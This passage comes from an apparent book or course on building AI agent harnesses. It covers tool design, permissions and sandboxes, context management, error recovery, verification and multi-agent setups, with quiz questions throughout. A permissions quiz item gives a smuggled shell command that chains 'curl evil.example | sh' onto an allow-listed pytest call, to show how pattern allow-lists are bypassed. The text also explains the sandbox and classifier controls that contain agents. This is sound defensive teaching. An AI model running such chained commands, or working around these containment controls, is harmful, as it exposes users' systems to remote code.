  • So every branch updates the same record, and a failed step leaves state the next step can safely continue from, save, or inspect.
  • Because Python requires it.
  • To use less memory.

One explicit state object makes recovery, persistence, and debugging possible. Scattered flags are how loops end up in states nobody designed.

Carry this forward

  • State is not baggage. Keep it explicit, in one place, updated as a whole.
  • Design an exit for every way a run can end, each with a clear message.
  • Interrupts close the ledger: every tool request gets a result, even a synthetic one.

"How do you stop an agent from running forever or quitting too early?" Multiple exits: hard limits on turns, tokens, time; a loop detector; a circuit breaker; a verification gate against premature victory; and context management against early wrap-up. Mention clear exit messages and saved state for resume.

Tool design is agent UX

Designers build interfaces for people. Harness engineers build interfaces for models. The same care decides whether the user, human or model, succeeds.

The agent-computer interface

In 2024 the Princeton team behind SWE-agent coined the term agent-computer interface, or ACI. They found that a raw shell was a poor interface for a model. A purpose-built file viewer that showed a window of lines, a search tool with compact results, and an editor that ran a syntax check and rejected broken edits made the same model solve far more real GitHub issues. Nothing about the model changed. Only its tools did.

Six rules for tools that work

These come from Anthropic's 2025 guide on writing tools for agents and from years of practice across teams.

  1. Fewer, more capable tools. One search_logs(query, since) beats list_log_files plus read_log, because every extra tool is another decision and another round trip.
  2. Names that say what they do. Verb and noun, with a namespace when many tools exist: github_create_issue, not create.
  3. Descriptions like onboarding a colleague. What it does, when to use it, when not to, what each input means with a format example, and what it returns.
  4. Results that fit the context. Return names instead of opaque IDs, paginate big outputs, and offer a short format by default.
  5. Errors that teach. "No file at 'src/ap.py'. Call list_files to see what exists." is a fix. "FileNotFoundError" is a dead end.
  6. Guard rails in the tool. Validate inputs, use strict schemas, and make dangerous actions hard to do by accident.
Replaces the whole file with content.

The model must re-type a 600-line file to change one line. It burns tokens, and a single dropped line silently deletes code. Nothing stops it.

Replace one exact, unique piece of text in a file.
Read the file first.
Errors: "old_text was not found. Read the file again; spaces
must match exactly." / "old_text appears 3 times. Include more
surrounding lines so it is unique."

Small, targeted, and self-correcting: the errors tell the model exactly how to recover. This is the design Rein uses in Step 3, and it resembles the editing tools shipped by major coding agents.

Tool annotations: a risk vocabulary

MCP lets tools carry hints about their behavior: readOnlyHint (changes nothing), destructiveHint (may delete or overwrite), idempotentHint (safe to repeat), and openWorldHint (talks to the outside world). A harness can use them to schedule and gate calls. But they are hints written by whoever built the tool, not guarantees; a harness still decides for itself.

Shrink the space of choices

More tools is not more power. Each tool definition costs context, and every extra option is a chance to choose wrong. The open-source project statewright reported that constraining which tools are available in each phase of a workflow took small local models from 2 out of 10 to 10 out of 10 on a SWE-bench subset. Anthropic found that letting agents write code that calls tools, instead of calling each tool directly, cut token use by up to 98.7 percent in one example, because intermediate data never had to pass through the model.

MCP: one plug for many tools

Without a shared protocol, connecting N apps to M services needs N times M integrations. With MCP it needs N plus M. Servers can run locally or as remote services over a streamable HTTP transport. In July 2026 a release candidate of the largest revision since launch made the protocol core stateless and added a formal extension framework, and the 2026 roadmap focuses on scaling, discovery, and enterprise needs. The cost to watch: every connected server's tool descriptions sit in the context. Harnesses now load tool definitions on demand, through tool search, rather than all at once.

Skills: procedures loaded on demand

A skill is a folder with a SKILL.md file of instructions, and sometimes scripts. Only its name and one-line description sit in the context. When a task matches, the agent reads the full file; when the file points to scripts or references, it reads those only if needed. That is progressive disclosure again. OpenAI reported that adding negative examples to skill descriptions, meaning "do not use this skill when...", raised correct skill selection in one of its tests from 73 to 85 percent.

Your agent keeps passing "next Tuesday" to a tool that needs a date in YYYY-MM-DD. What is the best fix?

  • Add "USE THE CORRECT DATE FORMAT" to the system prompt.
  • Switch to a bigger model.
  • Put the format and an example in the input's description, validate the input, and return an error that shows the correct format.

Fix the interface where the mistake happens. A clear description prevents most errors, validation catches the rest, and a teaching error message lets the model repair its own call on the next turn.

Carry this forward

  • Tools are the model's user interface. Design them with the same care.
  • Fewer, sharper tools; descriptions that onboard; errors that teach.
  • MCP and skills scale tools up; progressive disclosure keeps the context small.

"An agent misuses a tool. How do you debug it?" Read the trace to see the exact inputs; check whether the name, description, and input docs explain the right use; look at what the error message told the model; then fix the interface (description, validation, error text, or splitting the tool) and add an eval case for it.

Permissions and sandboxes

Once a model can call tools, the risk changes from saying something wrong to doing something wrong. Permissions decide what may happen; sandboxes decide how bad it can get if a decision is wrong.

Three verdicts, with reasons

Every tool call gets one of three verdicts: allow, ask a human, or deny. Analyses of Claude Code point out that its permission result is a small object with meaning and a reason, not a true-or-false flag. That matters, because the agent needs to know why it was stopped. "Denied: this command matches a destructive pattern. Do not retry; choose another way" lets the model adapt. A bare "false" leaves it guessing and retrying.

If an agent cannot tell "I may do this", "I may not do this", and "I must ask", it should not be touching a terminal. Terminals do not fill in missing meaning. They just execute.

Risk depends on the action and its target

  • Read-only inside the project (read, list, search): usually allow. Asking here only teaches people to click yes.
  • Reversible changes inside the project (edits under git): ask, or allow inside a sandbox with git as the undo button.
  • Destructive, outbound, or privileged (delete, push, install, network, sudo): deny, or ask with a clear explanation.

The shell is the most dangerous tool of all, because it can touch files, processes, networks, and git history almost without limit. Mature harnesses wrap it in the densest rules, especially around git: do not rewrite history, do not skip verification hooks, do not commit unless asked, do not push by default.

Of the ten calls coming, how many do you expect to deny outright? Keep your number in mind.

Why "just ask a human" quietly fails

Asking feels safe. In practice people approve almost everything, quickly, without reading. Anthropic reported that users approved about 93 percent of permission prompts in Claude Code, which makes each approval nearly meaningless. This is approval fatigue. Two responses have emerged:

  • Sandbox first, then allow more. If the agent runs inside walls, most actions become safe to allow. Anthropic said its Claude Code sandboxing cut permission prompts by 84 percent in internal use; Cursor built a similar sandbox using macOS Seatbelt and Linux Landlock with seccomp.
  • Auto mode with a classifier. In 2026 Claude Code added a mode where a model-based classifier decides instead of the user: a fast first check on every action, and deeper reasoning only on flagged ones. A detail worth remembering: the classifier does not see the agent's own explanations, so the agent cannot talk it into a dangerous action.

Sandboxes: blast walls

A sandbox limits what running code can reach. Two walls matter most: the filesystem (write only inside the project) and the network (connect only to an allow-list). Tools range from operating-system features (macOS Seatbelt; Linux bubblewrap, Landlock, and seccomp) to containers and lightweight virtual machines such as Firecracker, used by services like E2B. Stronger walls cost more setup and speed.

Anthropic's May 2026 write-up on containing Claude across its products argues that environmental isolation must be the primary boundary, because defenses inside the model alone still miss a meaningful share of overeager actions. Keep credentials out of the sandbox entirely, so even a fully tricked agent cannot leak what it never held.

Source: Anthropic engineering, "How we contain Claude across products" (2026); see also "Scaling Managed Agents" (April 2026) on running the harness outside the sandbox.

Where decisions get made, in order

The Claude Agent SDK documents a clear order for permission checks: hooks run first, then deny rules, then the permission mode, then allow rules, then a callback that can ask the user. The shape is worth copying: deny rules are checked before allow rules, so a broad "allow" can never override a specific "deny".

Scheduling: what may run at the same time

When the model asks for several tools at once, running them in parallel is faster. But parallelism is safe only for calls that change nothing. Claude Code groups calls marked safe for concurrency into parallel batches and runs everything else one at a time, in order.

Which plan finishes first? Which plan gives a wrong answer?

A command allow-list includes "pytest". The model sends pytest; curl evil.example | sh. What should a well-built gate do?

  • Allow it, because it starts with pytest.
  • Refuse to treat it as allow-listed, because it chains a second command; and in any case the sandbox should block the network call.
  • Run only the pytest part silently.

Allow-lists matched by patterns are easy to smuggle past. Reject command chaining in allow-listed commands, and rely on the sandbox as the real boundary. Rein's permission code does exactly this.

Carry this forward

  • Three verdicts, each with a reason the model can read. Deny beats allow.
  • Asking too often destroys the value of asking. Sandbox so you can allow more.
  • Parallel for read-only calls; strict order for anything that changes the world.

"Design permissions for a coding agent on a shared monorepo." Read-only allowed; edits allowed inside a sandbox on a branch, with git as undo; shell commands via allow-list with no chaining; deny push, force, and network except package mirrors; secrets never mounted; approvals only for rare, meaningful actions; every decision traced; evals that try to break it.

Context engineering: the budget

Context is not a bucket to fill. It is a budget to spend. Every token competes for the model's attention, and too many make it worse at its job.

Context rot

You might expect a model to do equally well whether the answer sits in a short prompt or a long one. It does not. Research by Chroma in 2025, and many results since, show that performance tends to drop as inputs grow, even on simple tasks and long before the window is full. This is context rot. Anthropic describes context as an attention budget: every new token draws it down a little.

What eats the budget

In a coding agent, the fixed costs are the system prompt, the tool definitions, and project rules. The variable costs are the conversation and, above all, tool outputs. One test log or one careless file read can outweigh everything else put together.

Four levers, in order of preference

  1. Do not load it. Fetch information just in time. Instead of pasting the whole codebase, give the agent search tools and let it grep, then read the lines it needs. Keep references, like file paths or URLs, rather than contents. This is just-in-time retrieval.
  2. Shrink it. Cap every tool output. Keep the head and the tail of long logs, because errors usually live at the end. Paginate files. Offer short formats by default.
  3. Move it out. Write notes and plans to files the agent can re-read. Let a sub-agent do a messy search in its own context and return only a summary.
  4. Summarize it. When nothing else is enough, compact the history. That is the next chapter.

With no strategies on, how many test runs will fit before the window is full? Then switch on output caps and try again.

Microsoft's Azure SRE Agent team described moving away from more than 100 specialized tools and a heavily prescriptive prompt. Instead they exposed source code, runbooks, query schemas, and past investigation notes as files, and let the agent use generic tools like read_file, grep, find, and a shell. Their "intent met" score on new incidents rose from 45 to 75 percent.

Source: Microsoft Tech Community, "Context engineering lessons from building Azure SRE Agent" (2026).

Make the repository readable to agents

OpenAI's harness team made the same discovery from the other side. Knowledge that lived in chat threads, documents, or people's heads was invisible to their agents. So they moved it into the repository: design documents, architecture maps, and plans as versioned files, with AGENTS.md pointing to them. The rule of thumb: if the agent cannot see it, it does not exist.

Order and repetition matter

Where things sit in the context changes how well they are used. Put stable content first, which also makes caching work. Keep the current goal near the end, where attention is freshest. The Manus team shared a simple trick: their agent rewrites a todo list at the end of the context as it works, which keeps the overall goal in recent view during long tasks. They call it manipulating attention through recitation.

An agent must answer a question about one function in a 3,000-file codebase. What is the best context strategy?

  • Give it a search tool; it finds the file, reads the relevant lines, and follows references as needed.
  • Put the entire codebase in the context, since the window is large.
  • Put only the README in the context.

Just-in-time retrieval keeps the context small and relevant. Loading everything costs a fortune per call and triggers context rot; loading too little leaves the model guessing.

Carry this forward

  • More context can mean worse answers. Treat tokens as an attention budget.
  • Prefer: do not load, then shrink, then move out, then summarize.
  • Put knowledge where agents can find it: in the repository, as files.

"The agent gets worse late in long sessions. Why, and what do you do?" Context rot and budget pressure. Cap and truncate tool outputs, move to just-in-time retrieval, offload notes to files, isolate heavy exploration in sub-agents, and compact with a structured summary. Then prove it with an eval on long sessions.

Compaction, memory, and caching

Long tasks outgrow any window. Compaction keeps them going, memory tiers keep what matters, and caching keeps it affordable. All three must be done with care, or they quietly lose the work.

Compaction: summarize, but rebuild the work

Compaction replaces older history with a summary and keeps recent turns word for word. The goal is not a shorter transcript. The goal is that the agent can keep working as if nothing happened. So a good summary rebuilds the working state: the original goal, decisions made, the current plan, files touched, open problems, and recent errors. A summary that loses the thread of what we were actually doing is not compression. It is data loss with extra steps.

Two rules protect you:

  • Never split a tool pair. A tool request and its result must stay together, or the history becomes invalid.
  • Never rely on compaction for critical rules. Anything that must always hold belongs in the system prompt or a rules file, which is re-sent every turn and survives any summary.

Analyses of Claude Code describe compaction as layered, from cheap to expensive: first shrinking what tools return, then trimming, then lighter micro-compaction, and only then a full summary. It also counts compaction failures and stops trying after several in a row, a detail the next chapter explains.

With auto-compact on, you can keep working forever. What gets lost each time? Now switch on the notes file and compare.

Compaction or a clean reset?

Compaction keeps the same agent going on a shortened history. A context reset starts a fresh agent and hands over state through files. Anthropic found that Claude Sonnet 4.5 showed "context anxiety" strongly enough that compaction alone was not enough; resets with good handoff notes worked better. With Opus 4.5 that behavior largely disappeared, so a later harness dropped resets and relied on automatic compaction. The right choice depends on the model, which is why you measure instead of assuming. Chapter 23 goes deeper.

Memory tiers

Mixing these into one pile is how systems either forget important rules or drown in old chat. Claude Code's design, as described in public analyses, keeps them apart: long-lived project rules in CLAUDE.md, a memory index file that points to details rather than recording everything, short-term session memory with its own budget, and automatic compaction as the safety valve.

Prompt caching: the cost lever

Because the whole history is re-sent every turn, most of each request is the same as the last one. Prompt caching lets the provider reuse its work on an identical prefix instead of processing it again. On Anthropic's API, reading from the cache costs about a tenth of the normal input price, and it is faster. The catch is in the word identical: a single changed character early in the prompt invalidates everything after it, because of how the underlying KV cache works.

What will one timestamp at the top of the system prompt do to the cost?

So cache-friendly harnesses follow a few habits: stable content first and volatile content last; history that only ever grows at the end; tools and JSON serialized in a fixed order; no timestamps or random IDs near the top; and no swapping of tool lists in the middle of a session. The Manus team called the cache hit rate the single most important metric for a production agent. Claude Code applies the same discipline to sub-agents: a forked agent shares the parent's cache-critical settings, so the fork reuses the parent's cache instead of paying for everything again.

After compaction, the agent rewrote a file in a style the team banned. The ban had been stated once in the chat an hour earlier. What is the right fix?

  • Compact less often.
  • Move the rule to AGENTS.md or the system prompt, where it is re-sent every turn, and add a linter check if it matters.
  • Ask the model to remember harder.

Summaries lose detail by design. Durable rules belong in durable places, and rules with real cost belong in computational checks.

Carry this forward

  • Compaction must rebuild working state, keep tool pairs intact, and never carry the only copy of a rule.
  • Separate memory tiers by the question they answer.
  • Caching rewards stable prefixes. Order your prompt from most stable to least.

"How would you cut the cost of a long-running agent by half without hurting quality?" Measure where tokens go from traces; cap tool outputs; make the prefix cache-stable and check hit rates; compact earlier with structured summaries; push exploration into sub-agents; then prove quality held with the regression eval suite.

Errors are the main path

In ordinary programs the happy path is the real code and errors are rare. In a long-running agent, failure is the weather: it happens every day, and the harness must be built to work through it.

The least trustworthy phrase in engineering

"Under normal conditions" hides everything that matters. A session that runs for an hour will almost certainly meet a rate limit, an overloaded server, a tool that crashes, a reply cut off mid-sentence, and a context that fills up. The Claude Code design book puts it plainly: error paths are main paths. Recovery must be designed at the start, not patched in after an incident.

A field guide to failures

FailureExampleRight response
Transient errorRate limit, overload, network blipRetry with backoff and jitter, counted and limited
Context overflow"Prompt is too long"Compact, then retry once. Not in a loop.
Cut-off replystop_reason max_tokensAsk it to continue. Continuation beats a recap.
Tool errorFile not found, test failedReturn it to the model as information
Malformed callUnknown tool, missing inputSend a repair message listing what is valid
No progressSame call repeatedLoop detection: tell it to change approach, or stop
InterruptUser presses stopClose open calls with synthetic results
FatalInvalid API key, a bug in the harnessStop at once and say exactly what broke

Keep the wrong stuff in

A tempting cleanup is to hide failed attempts from the model to keep the context tidy. The Manus team argued for the opposite: leave errors and failed actions visible, because seeing a failure and its message is how the model avoids repeating it. A tool error is information, not an embarrassment.

Retry with backoff and jitter

When a call fails for a temporary reason, wait and try again, and wait longer after each failure: half a second, then one, two, four, up to a cap. This is retry with backoff. Add a little randomness, called jitter, so that a thousand agents hit by the same outage do not all retry at the same instant and knock the service over again.

delay = min(cap, base * 2 ** (n - 1)) * random.uniform(0.5, 1.0)

Recovery needs its own brakes

A recovery system that retries forever is its own hazard. It can trap a session in a silent, expensive spin that never reaches a human. The book on Claude Code's source describes exactly this: sessions once burned large numbers of API calls on repeated automatic compaction failures, so the harness now counts consecutive failures and stops trying past a limit. That is a circuit breaker: after several failures in a row it opens, stops the attempts, and reports clearly.

A household circuit breaker is supposed to trip under overload. That is not a flaw; it is the safety feature working. Wiring with no breaker looks fine, right up until the fire.

At a 90 percent failure rate with four attempts, how many of 10 requests succeed? Then switch on "retry forever" and watch the call count.

Every automatic recovery must be counted, limited, and able to give up. If you cannot say how many times it will retry and what happens after the last try, it is not recovery. It is a loop.

Retrying actions safely

Retrying a model call is safe: it has no side effects. Retrying a tool call may not be. If "send the invoice email" timed out, did the email go out? Tools that can be safely repeated are called idempotent. For the others, use an idempotency key so the service ignores duplicates, or check the state before retrying. Tool annotations can mark which is which.

Two more tools belong in your kit: fallbacks, such as switching to a backup model or provider when one is down, and checkpoints, such as git commits or saved state, so a bad run can be rolled back instead of repaired by hand.

Automatic compaction fails because the summary request itself is too long. The harness retries compaction on every turn. What goes wrong?

  • Nothing; it will eventually succeed.
  • The model gets smarter with each retry.
  • Each turn burns an expensive call that fails the same way. It needs a counter and a breaker, plus a different fallback, such as trimming the oldest turns.

Repeating a recovery that cannot work in the current state wastes money and hides the real problem. Count failures, stop after a threshold, and switch to another strategy or report.

Carry this forward

  • Failures are routine. Design a response for each kind, up front.
  • Backoff with jitter for transient errors; tool errors go back to the model as information.
  • Recovery must be counted, limited, and able to give up: breakers everywhere.

"Implement retries for an LLM client." Retry only transient errors; exponential backoff with a cap and jitter; a maximum number of attempts; log every retry; a circuit breaker across requests; do not retry non-idempotent actions blindly. Bonus: explain why the SDK's own retries were turned off so the harness owns the policy.

Verification: done is a claim

The agent that just built something is the worst-placed party to judge it. It is motivated, even without meaning to be, to see "I wrote it" as "it works".

Why agents grade themselves too kindly

Anthropic's 2026 work on long-running harnesses described the pattern bluntly: when asked to evaluate their own output, agents tend to praise it confidently, even when a human finds it plainly mediocre. Their early QA agent would find a real bug, then talk itself into approving the work anyway. The fix was not a sterner prompt for the builder. It was a separate evaluator, which turned out to be far easier to tune into a skeptic.

Computational beats inferential

There are two kinds of checks. A computational check is deterministic: tests, type checkers, linters, builds. It is cheap, fast, and gives the same answer every time. An inferential check uses a model, such as an LLM reviewer. It can judge things code cannot, like whether a design is good, but it is itself uncertain. Use computational checks wherever they exist, and inferential ones for the rest.

Guides and sensors

Birgitta Böckeler's 2026 article on harness engineering, on martinfowler.com, offers a clean way to sort every control you add. Guides steer the agent before it acts. Sensors check what it did afterwards and feed the result back so it can correct itself. Each can be computational or inferential.

ComputationalInferential
Guides (before)Project templates, type definitions, code generatorsAGENTS.md, docs, skills, examples
Sensors (after)Tests, linters, type checks, buildsLLM code review, an evaluator agent with a rubric

A good sensor speaks to the agent. OpenAI's harness team wrote custom linters whose error messages included the fix, so a violation became a lesson the agent could act on immediately, not just a red mark.

The verification gate

The single most valuable pattern in this chapter: when the model says it is done, the harness runs the checks. If they fail, the harness refuses to finish and sends the failure output back as the next message. The model cannot talk its way past a failing test. Claude Code exposes this moment as a "Stop" hook; Rein builds it into the loop in Step 9.

With no checks on, how many of the 20 "done" tasks are really broken? Turn on tests. How many bugs still escape?

Independent reviewers, done right

When tests cannot tell you everything, add an independent reviewer: a separate agent with a fresh context, read-only tools, and a strict rubric. It did not write the code, so it has no stake in approving it. Anthropic's long-running harness went one step further with sprint contracts: before building, the builder and the evaluator agreed on exactly what "done" would mean and how it would be tested. One sprint alone had 27 testable criteria. The evaluator then clicked through the running app and filed specific bugs against the contract.

Two cautions from the same work. First, an evaluator costs time and money; it earns its place only when the task is beyond what the model reliably does alone. Second, a reviewer is still a model: calibrate it with examples where you know the right verdict.

Verification is not only for code. Plans, recommendations, and even an agent's updates to its own memory are claims too. Anything the system is tempted to mark "done" without a second look deserves one.

Which pairing is the strongest verification setup for a feature change?

  • The harness runs the test suite itself, then an independent read-only reviewer checks the change against the task.
  • The same agent re-reads its code and confirms it looks right.
  • A longer system prompt telling the agent to be careful.

Independence is what makes verification work: a computational check the agent cannot argue with, then an inferential check from someone who did not do the work.

Carry this forward

  • "Done" is a claim. The harness checks it before accepting it.
  • Computational checks first; inferential checks for what code cannot judge.
  • The judge must not be the builder. Separate roles, separate contexts.

"How do you know your agent's output is correct?" Describe the layers: guides that prevent errors, a verification gate that runs tests before accepting done, an independent reviewer for what tests miss, and evals over many runs to measure how often it all works. Mention that sensors should return actionable messages.

Many agents: when and how

Past a certain size, the question stops being "can one agent do this?" and becomes "how should the work be divided so nobody grades their own homework, and nobody gets lost?"

Two honest reasons, and one warning

There are two good reasons to add agents:

  • Context isolation. A sub-agent can dig through fifty files in its own fresh context and hand back a one-paragraph summary. The main agent's desk stays clean.
  • Parallel work. Independent pieces, such as researching five competitors, can run at the same time.

And role separation, as the last chapter showed, is a third: a verifier that did not do the work.

"More agents means smarter." In June 2025 Cognition, the company behind the Devin coding agent, published "Don't build multi-agents". Their point: every action carries hidden decisions, and agents working in parallel without the full shared context make choices that conflict. Two agents build two halves of a game in two different art styles. Their advice: prefer one agent with a single, well-compressed line of context, unless you have a strong reason.

The bill

Anthropic reported that in its data, agents used about 4 times the tokens of chat conversations, and its multi-agent research system about 15 times. On their browsing benchmark, how many tokens were spent explained most of the difference in performance. Multi-agent designs pay off for broad, valuable tasks that split cleanly, and waste money on tasks that do not.

Source: Anthropic engineering, "How we built our multi-agent research system" (June 2025).

Which shape has the lowest cost? Which has the fastest wall-clock time, and what does it pay for that speed?

Isolated or forked

A sub-agent can start in two ways. An isolated sub-agent begins with a fresh context and only a task description, which acts as a firewall against clutter. A forked sub-agent inherits the parent's whole conversation, so it understands everything, and if the prefix stays identical it also reuses the parent's prompt cache. LangChain added explicit modes for both in September 2026. Claude Code's fork logic, as described in source analyses, puts cache safety first: a fork must share the parent's cache-critical settings or every fork re-pays for the full context.

It is a distributed system

Once agents hand work to each other, you have the classic problems of distributed systems: messages that lose detail, parts that fail independently, conflicting writes. GitHub's engineers made the same point in February 2026: treat each handoff like an API, with a typed schema and validation at the boundary. Coordinators must actually synthesize what workers return, reconciling conflicts, rather than forwarding output.

Lifecycle matters too. A sub-agent must be observable while it runs, interruptible, and cleaned up: when the parent aborts, its children must abort as well, so nothing keeps running orphaned in the background, spending money.

Where this is heading

In May 2026 Anthropic introduced dynamic workflows in Claude Code: the model writes an orchestration script that fans work out to many parallel sub-agents, with adversarial verification, so the plan lives in code rather than in one context window. They used it on very large jobs, such as porting a codebase of hundreds of thousands of lines between languages.
